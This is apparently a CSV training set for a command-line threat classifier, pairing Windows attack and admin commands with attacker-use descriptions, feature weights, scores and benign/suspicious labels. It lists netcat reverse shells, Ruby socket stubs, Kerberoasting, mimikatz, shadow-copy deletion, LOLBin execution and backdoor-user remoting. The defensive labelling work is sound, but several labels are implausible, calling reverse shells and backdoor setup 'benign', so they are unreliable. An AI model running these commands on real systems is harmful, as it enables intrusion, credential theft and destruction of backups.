prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
dnx.exe consoleapp,"Potential use in a cyberattack: Running a console application to execute malicious code or commands.
What it might do on a Windows machine: Launches the .NET Execution Environment (DNX) to run a console application on a Windows machine.",dnx.exe,none,none,none,none,consoleapp,none,0.15,benign,,
Sqlps.exe -noprofile,"Potential use: Execute SQL commands without leaving traces in the PowerShell history.

What it does: Launches the SQL Server PowerShell module without loading the user's PowerShell profile.",Sqlps.exe,none,none,none,none,-noprofile,none,0.15,benign,,
Vsjitdebugger.exe calc.exe,"This command can be used to launch the Windows calculator (calc.exe) as a child process of the Visual Studio Just-In-Time Debugger (vsjitdebugger.exe), potentially allowing an attacker to execute arbitrary code or commands on the compromised machine.",Vsjitdebugger.exe,calc.exe,none,none,none,none,none,0.15,benign,,
powershell Get-DomainUser | select -ExpandProperty cn,"Potential use: Enumeration of domain users.
What it does: Retrieves the common name (cn) property of all domain users.",powershell,none,none,none,none,"Get-DomainUser,select,-ExpandProperty",none,0.15,benign,,
powershell Get-DomainUser | select -ExpandProperty cn,"Potential use: Enumeration of domain users.
What it does: Retrieves the common name (cn) property of all domain users.",powershell,none,none,none,none,"Get-DomainUser,select,-ExpandProperty",none,0.15,benign,,
powershell Get-DomainComputer,"Potential use: Enumeration of domain computers.
What it does: Retrieves a list of all computers in the current domain.",powershell,none,none,none,none,Get-DomainComputer,none,0.15,benign,,
powershell Get-ForestDomain,"Potential use in a cyberattack: Gathering information about the target network's forest domain.

What it might do on a Windows machine: Retrieves information about the forest domain in Active Directory, including the domain name, domain controllers, and trusts.",powershell,none,none,none,none,Get-ForestDomain,none,0.15,benign,,
powershell Get-DomainTrust,"Potential use: Enumeration of trusted domains in a network for lateral movement.

What it does: Retrieves information about trusts established between the current domain and other domains in the forest.",powershell,none,none,none,none,Get-DomainTrust,none,0.15,benign,,
powershell Get-ForestTrust,"Potential use in a cyberattack: Gathering information about trusted domains in a forest for lateral movement.

What it might do on a Windows machine: Retrieves information about forest trusts, including the trusted domain name, direction of trust, and trust type.",powershell,none,none,none,none,Get-ForestTrust,none,0.15,benign,,
powershell Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC,This command can be used to find network shares on a Windows machine and can be used in a cyberattack to identify potential targets for lateral movement or data exfiltration.,powershell,none,none,none,none,"Find-DomainShare,-ExcludeStandard,-ExcludePrint,-ExcludeIPC",none,0.15,benign,,
powershell Get-DomainOU -FullData,"Potential use: Reconnaissance.

What it does: Retrieves detailed information about all Organizational Units (OUs) in a domain, including their names, descriptions, distinguished names, and security descriptors.",powershell,none,none,none,none,"Get-DomainOU,-FullData",none,0.15,benign,,
powershell Find-InterestingDomainAcl | select identityreferencename,"Potential use: Enumeration of domain permissions and users.
What it does: Uses PowerShell to search for interesting domain ACLs and selects the identity reference name.",powershell,none,none,none,none,"Find-InterestingDomainAcl,select",none,0.15,benign,,
powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections,"This command can be used to retrieve the AppLocker policy and its rule collections, which can be useful for an attacker to understand the restrictions in place and potentially bypass them.",powershell,none,none,none,none,"Get-AppLockerPolicy,-Effective,select,-ExpandProperty",none,0.15,benign,,
powershell Find-LocalAdminAccess,"Potential use: Identify local administrator accounts on a compromised machine.
What it does: Searches for local administrator accounts on the machine using PowerShell.",powershell,none,none,none,none,Find-LocalAdminAccess,none,0.15,benign,,
powershell Get-DomainUser -SPN | select name,"Potential use: Enumeration of domain users with Service Principal Names (SPNs) for Kerberos attacks.
What it does: Retrieves a list of domain users with SPNs and selects their names for output.",powershell,none,none,none,none,"Get-DomainUser,-SPN,select",none,0.15,benign,,
powershell Get-DomainUser -PreauthNotRequired | select name,"Potential use in a cyberattack: Enumeration of domain users who do not require pre-authentication, which can aid in password cracking or lateral movement.

What it might do on a Windows machine: Executes a PowerShell cmdlet to retrieve a list of domain users who do not require pre-authentication and selects their names for output.",powershell,none,none,none,none,"Get-DomainUser,-PreauthNotRequired,select",none,0.15,benign,,
powershell Get-DomainComputer -Unconstrained,"Potential use: Enumeration of domain computers.
What it does: Retrieves a list of domain computers that are not constrained by the default security settings.",powershell,none,none,none,none,"Get-DomainComputer,-Unconstrained",none,0.15,benign,,
powershell Get-DomainUser -TrustedToAuth | select userprincipalname,"Potential use: Enumeration of domain users.
What it does: Retrieves a list of domain users that are trusted for delegation and selects their user principal names.",powershell,none,none,none,none,"Get-DomainUser,-TrustedToAuth,select",none,0.15,benign,,
powershell Get-DomainComputer -TrustedToAuth | select name,"Potential use in a cyberattack: Enumeration of domain computers for lateral movement.

What it might do on a Windows machine: Retrieves a list of domain computers that have the ""TrustedToAuth"" flag set and selects the name property for display.",powershell,none,none,none,none,"Get-DomainComputer,-TrustedToAuth,select",none,0.15,benign,,
powershell Invoke-BloodHound -CollectionMethod All,"This command can be used to gather information about the network and identify potential attack paths, and it will collect data from all available methods in BloodHound on a Windows machine.",powershell,none,none,none,none,"Invoke-BloodHound,-CollectionMethod,All",none,0.15,benign,,
powershell Invoke-BloodHound -CollectionMethod LoggedOn,"This command can be used to gather information about the network and identify potential attack paths by querying the Active Directory and mapping out the relationships between users, groups, and computers that are currently logged on to the network.",powershell,none,none,none,none,"Invoke-BloodHound,-CollectionMethod,LoggedOn",none,0.15,benign,,
powershell SharpHound.ps1,"Potential use: Collects information about Active Directory for reconnaissance purposes.
On a Windows machine: Executes a PowerShell script that can gather information about the Active Directory environment.",powershell,none,none,none,none,SharpHound.ps1,none,0.15,benign,,
powershell Invoke-TokenManipulation -Enumerate,"This command can be used to enumerate all available tokens on a Windows machine, which can be useful for privilege escalation in a cyberattack.",powershell,none,none,none,none,"Invoke-TokenManipulation,-Enumerate",none,0.15,benign,,
powershell Invoke-Kerberoast,"Can be used to extract Kerberos tickets and crack them offline, potentially leading to privilege escalation.",powershell,none,none,none,none,Invoke-Kerberoast,none,0.15,benign,,
powershell Get-NetUser -SPN,"Potential use: Enumeration of user accounts and their Service Principal Names (SPNs) for Kerberos authentication.
What it does: Retrieves a list of user accounts and their associated SPNs from the local or remote Windows machine using PowerShell.",powershell,none,none,none,none,"Get-NetUser,-SPN",none,0.15,benign,,
diskshadow list shadows all,"Potential use in a cyberattack: Checking for the presence of shadow copies to delete them and hinder recovery efforts.
What it does on a Windows machine: Lists all available shadow copies on the system.",diskshadow,none,none,none,none,"list,all",none,0.15,benign,,
telnet hostname.domain.com 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified hostname on port 80 using the Telnet protocol.",none,none,none,none, hostname.domain.com:80,telnet,none,0.15,benign,,
telnet 10.10.10.10 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified IP address on port 80 using the Telnet protocol.",none,none,none,none,10.10.10.10:80,telnet,none,0.15,benign,,
telnet 11.11.11.11 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified IP address on port 80 using the Telnet protocol.",none,none,none,none,11.11.11.11:80,telnet,none,0.15,benign,,
nc.exe 192.168.100.113 4444,This command can be used to establish a reverse shell to a remote attacker-controlled machine on port 4444.,nc.exe,none,none,none,192.168.100.113:4444,none,none,0.15,benign,,
nc.exe 193.168.100.113 4444,This command can be used to establish a reverse shell to a remote attacker-controlled machine on port 4444.,nc.exe,none,none,none,193.168.100.113:4444,none,none,0.15,benign,,
wmic logicaldisk,Query information about logical drives,wmic,none,none,none,none, logicaldisk,none,0.15,benign,,
wmic cpu get name,show cpu info,wmic,none,none,none,none, cpu get name,none,0.15,benign,,
powershell Get-Service ,List services in PowerShell,powershell,none,none,none,none,Get-Service ,none,0.15,benign,,
schtasks /create /tn MyTask ... ,Create new scheduled task,schtasks,none,none,none,none,/create /tn MyTask ... ,none,0.15,benign,,
schtasks /query ,List scheduled tasks,schtasks,none,none,none,none,/query ,none,0.15,benign,,
psexec \\test.domain -u Domain\User -p Password ipconfig,"This command can be used to remotely execute ipconfig on a target machine using psexec, which can be useful for gathering network information during a cyberattack.",none,none,none,none,test.domain,ipconfig,none,0.20,suspicious,,
EQNEDT32.EXE -Embedding,Adversaries may exploit CVE-2017-11882 vulnerability in eqnedt32 for remote code execution in target system.,EQNEDT32.EXE,none,none,none,none,embedding,Mitre Attack,0.2,suspicious,,
“C:\Windows\system32\attrib.exe” +h C:\Users\admin\Pictures\*.* /s,Adversaries may use attrib.exe to hide files for defense evasion on the target system.,attrib.exe,none,none,none,none, /s,Mitre Attack,0.2,suspicious,,
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I,Adversaries may abuse schtasks.exe utility to initiate execution or repeat execution of malicious code .,schtasks,none,none,none,none,"/run, I",Mitre Attack,0.2,suspicious,,
Vssadmin.exe delete shadows /all /quiet,Adversaries may use vssadmin.exe to delete volume shadow copies to prevent system recovery.,vssadmin.exe,none,none,none,none,delete shadows /all /quiet,Mitre Attack,0.2,suspicious,,
tracert google.com,Trace route to a host,none,none,none,none,google.com,tracert,none,0.2,benign,,
mkdir C:\Logs\2025,Create a folder,none,none,none,C:\Logs\2025,none,mkdir,none,0.2,benign,,
ftp 192.168.20.23,Transfer files to/from FTP servers,none,none,none,none,192.168.20.23,ftp,none,0.2,benign,,
move C:\file.txt D:\docs\ ,Move file to another location,none,none,none, C:\file.tx,none,move,none,0.2,benign,,
ping -t 8.8.8.8 ,Continuous ping,none,none,none,none,8.8.8.8 ,ping -t 8.8.8.8 ,none,0.2,benign,,
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,"This command can be used to test RPC connectivity and authentication, and in a cyberattack, it can be used to check if RPC is enabled and accessible on a target machine and potentially exploit it by establishing a connection and executing commands remotely.",rpcping,none,none,none,127.0.0.1,"-s,-e,-a,-u",none,0.25,benign,,
"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1""","This command opens a TCP socket to IP address 10.0.0.1 using the Ruby programming language, which could potentially be used to establish a remote connection to a target machine for further exploitation or data exfiltration.",none,none,none,none,10.0.0.1,"-rsocket,-e,TCPSocket.new",none,0.25,suspicious,,
"ruby -rsocket -e 'c=TCPSocket.new(""11.0.0.1""","This command opens a TCP socket to IP address 11.0.0.1 using the Ruby programming language, which could potentially be used to establish a remote connection to a command and control server for data exfiltration or further exploitation.",none,none,none,none,11.0.0.1,"-rsocket,-e,TCPSocket.new",none,0.25,suspicious,,
lua5.1 -e 'local host,"This command executes a Lua script on the machine, which could potentially be used to run malicious code or commands.",lua5.1,none,none,none,localhost,-e,none,0.25,suspicious,,
lua5.1 -e 'local host,"This command executes a Lua script on the machine, which could potentially be used to run malicious code or commands.",lua5.1,none,none,none,localhost,-e,none,0.25,suspicious,,
"powershell Get-DomainGPO -Name ""{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}""","Potential use: Enumeration of Group Policy Objects (GPOs) for lateral movement and privilege escalation.

What it does: Retrieves the specified GPO by name from the domain and displays its properties.",powershell,none,none,3E04167E-C2B6-4A9A-8FB7-C811158DC97C,none,Get-DomainGPO,none,0.25,benign,,
powershell Set-RemotePSRemoting -UserName BackdoorUser -ComputerName dc.targetdomain.com,"This command can be used to enable remote PowerShell remoting on a target machine, allowing an attacker to remotely execute commands and potentially establish persistence on the compromised system.",powershell,none,none,none,dc.targetdomain.com,Set-RemotePSRemoting,none,0.25,benign,,
powershell Set-RemoteWMI -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace 'root\cimv2',This command can be used to remotely set up a backdoor user account on a target domain controller machine using Windows Management Instrumentation (WMI).,powershell,none,none,none,dc.targetdomain.com,Set-RemoteWMI,none,0.25,benign,,
nc -l -p 6790,"This command sets up a listener on port 6790, which could be used to receive incoming connections or data from a remote attacker.",nc,none,none,none,6790,"-l,-p",none,0.25,benign,,
nc.exe -lnvp 8080,"This command opens a listening port on the local machine, potentially allowing an attacker to establish a reverse shell or transfer files.",nc.exe,none,none,none,8080,-lnvp,none,0.25,benign,,
psexec \\10.10.10.10 -u Domain\User -p Password ipconfig,"This command can be used to remotely execute ipconfig on a target machine using psexec, which can be useful for gathering network information during a cyberattack.",none,none,none,none,10.10.10.10,ipconfig,none,0.30,suspicious,,
Cmd /k start chrome https://onedrive.live.com/embed?cid=880174EF88F116A9,Adversaries can spawn chrome.exe to download malicious files on the target system.,cmd,none,none,https://onedrive.live.com/embed?cid=880174EF88F116A9,none,Cmd /k start,Mitre Attack,0.3,suspicious,,
mimikatz.exe,"Can be used to extract plaintext passwords, hashes, and Kerberos tickets from memory on a Windows machine.",none,mimikatz.exe,none,none,none,none,none,0.40,suspicious,,
rundll32.exe dfshim.dll,This command can be used to execute .NET applications and could potentially be used to run malicious code or execute a payload on a Windows machine.,rundll32.exe,dfshin.dll,none,none,none,none,none,0.45,suspicious,,
InfDefaultInstall.exe Infdefaultinstall.inf,"Potential use: Install a malicious driver or application.
What it does: Installs a driver or application using the information in the specified .inf file.",InfDefaultInstall.exe,Infdefaultinstall.inf,none,none,none,none,none,0.45,suspicious,,
jsc.exe scriptfile.js,"Execute a JScript or JavaScript file, which could potentially be used to run malicious code or scripts on a Windows machine.",jsc.exe,scriptfile.js,none,none,none,none,none,0.45,suspicious,,
msbuild.exe pshell.xml,"Potential use: Execute PowerShell scripts without invoking powershell.exe, which may bypass security restrictions.

What it does: Executes the MSBuild tool with the specified project file (pshell.xml), which may contain PowerShell code to be executed.",msbuild.exe,pshell.xml,none,none,none,none,none,0.45,suspicious,,
msbuild.exe project.csproj,"Potential use: Build malicious code or execute arbitrary code.
What it does: Compiles a Visual Studio project file into an executable or library.",msbuild.exe,project.csproj,none,none,none,none,none,0.45,suspicious,,
mshta.exe evilfile.hta,This command can be used to execute malicious code embedded in an HTA file and potentially gain remote access to a Windows machine.,mshta.exe,evilfile.hta,none,none,none,none,none,0.45,suspicious,,
"mshta.exe ""C:\\ads\\file.txt:file.hta""","This command can be used to execute a malicious HTA file disguised as a harmless text file, allowing an attacker to run arbitrary code on the victim's machine.",mshta.exe,C:\\ads\\file.txt:file.hta,none,C:\\ads\\file.txt:file.hta,none,none,none,0.45,suspicious,,
msiexec /quiet /i cmd.msi,"This command can be used to silently install a malicious payload (in this case, cmd.msi) on a victim's machine without their knowledge or consent.",msiexec,cmd.msi,none,none,none,"/quiet,/i",none,0.45,suspicious,,
regasm.exe AllTheThingsx64.dll,"Registers a .NET assembly as a COM component, potentially allowing an attacker to execute arbitrary code on the system.",regasm.exe,AllTheThingsx64.dll,none,none,none,none,none,0.45,suspicious,,
regini.exe newfile.txt:hidden.ini,"This command can be used to hide a file (hidden.ini) by modifying the registry settings through a script (newfile.txt), which can be used in a cyberattack to conceal malicious files or data on a Windows machine.",regini.exe,newfile.txt:hidden.ini,none,none,none,none,none,0.45,suspicious,,
regsvcs.exe AllTheThingsx64.dll,This command can be used to execute arbitrary code and potentially achieve persistence on a compromised Windows machine.,regsvcs.exe,AllTheThingsx64.dll,none,none,none,none,none,0.45,suspicious,,
regsvcs.exe AllTheThingsx64.dll,This command can be used to execute arbitrary code and potentially achieve persistence on a compromised Windows machine.,regsvcs.exe,AllTheThingsx64.dll,none,none,none,none,none,0.45,suspicious,,
"rundll32 ""C:\\ads\\file.txt:ADSDLL.dll""","This command can be used to execute a DLL file hidden in an Alternate Data Stream (ADS) of a text file, potentially allowing an attacker to execute malicious code on a Windows machine.",rundll32 ,C:\\ads\\file.txt:ADSDLL.dll,none,C:\\ads\\file.txt,none,none,none,0.45,suspicious,,
rundll32.exe advpack.dll,This command can be used to execute malicious code or install malware through the installation of ActiveX controls or other software packages.,rundll32.exe,advpack.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe advpack.dll,This command can be used to execute malicious code or install malware through the installation of ActiveX controls or other software packages.,rundll32.exe,advpack.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe ieadvpack.dll,This command can be used to execute arbitrary code and potentially download and install malware on a Windows machine.,rundll32.exe,ieadvpack.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe ieadvpack.dll,This command can be used to execute arbitrary code and potentially download and install malware on a Windows machine.,rundll32.exe,ieadvpack.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe ieframe.dll,This command can be used to launch Internet Explorer and potentially execute malicious code or download additional malware onto the system.,rundll32.exe,ieframe.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe Mshtml.dll,"Potential use: Execute malicious code through a legitimate Windows process.
What it does: Loads the Mshtml.dll library and executes any exported function within it.",rundll32.exe,Mshtml.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe pcwutl.dll,"This command is used to launch the Performance Monitor Wizard, which could potentially be used to gather system performance data for reconnaissance purposes in a cyberattack.",rundll32.exe,pcwutl.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe setupapi.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Runs a function in setupapi.dll, which is used for installing device drivers and other system components.",rundll32.exe,setupapi.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe setupapi.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Runs a function in setupapi.dll, which is used for installing device drivers and other system components.",rundll32.exe,setupapi.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe shdocvw.dll,This command can be used to execute arbitrary code and potentially download and execute additional malware on a Windows machine.,rundll32.exe,shdocvw.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe shell32.dll,"Potential use: Execute shell commands from DLL files.
What it does: Loads the shell32.dll file and executes the specified command.",rundll32.exe,shell32.dll,none,none,none,none,none,0.45,suspicious,,
